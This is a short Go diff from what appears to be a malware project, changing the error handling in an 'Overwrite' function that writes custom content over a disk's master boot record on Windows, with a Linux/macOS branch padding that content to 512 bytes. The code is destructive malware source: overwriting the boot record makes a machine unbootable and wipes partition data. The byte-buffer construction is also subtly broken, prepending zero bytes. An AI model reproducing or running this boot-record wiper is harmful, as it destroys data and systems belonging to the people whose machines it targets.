@@ -129,13 +129,13 @@ func Overwrite() {
 		in, err := os.Open(target)
 		if err != nil {
 			notify.Error(err.Error(), "MBR.Overwrite_MBR()")
-			return
+		} else {
+			bytes := make([]byte, len(c_mbr.mbr_content))
+			for _, line := range c_mbr.mbr_content {
+				bytes = append(bytes, []byte(line)...)
+			}
+			in.Write(bytes)
 		}
-		bytes := make([]byte, len(c_mbr.mbr_content))
-		for _, line := range c_mbr.mbr_content {
-			bytes = append(bytes, []byte(line)...)
-		}
-		in.Write(bytes)
 
 	case "linux", "darwin":
 		for len(c_mbr.mbr_content) < 512 { // Until it's a size of 512 bytes
